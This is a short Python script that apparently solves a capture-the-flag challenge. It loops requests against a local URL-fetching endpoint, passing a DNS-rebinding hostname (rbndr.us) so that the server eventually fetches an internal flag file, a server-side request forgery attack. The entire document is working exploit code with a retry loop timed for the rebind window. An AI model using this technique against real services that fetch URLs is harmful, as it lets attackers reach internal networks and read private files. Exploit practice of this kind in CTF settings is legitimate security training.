import requests

BASE_URL = "http://localhost:5006/fetch?url="
payload = "http://0a64000a.93a80001.rbndr.us/internal/flag.txt%"

found = False
while not found:
    try:
        r = requests.get(BASE_URL + payload, timeout=5)
        if "Securinets"  in r.text :
            found = True
            print("Found it:", r.text)
    except requests.exceptions.RequestException as e:
        print("Request failed , retrying...", e)
        # timeout / connection error — just means this attempt missed the rebind window
    if not found:
        print("Request failed or did not find the expected response, retrying...")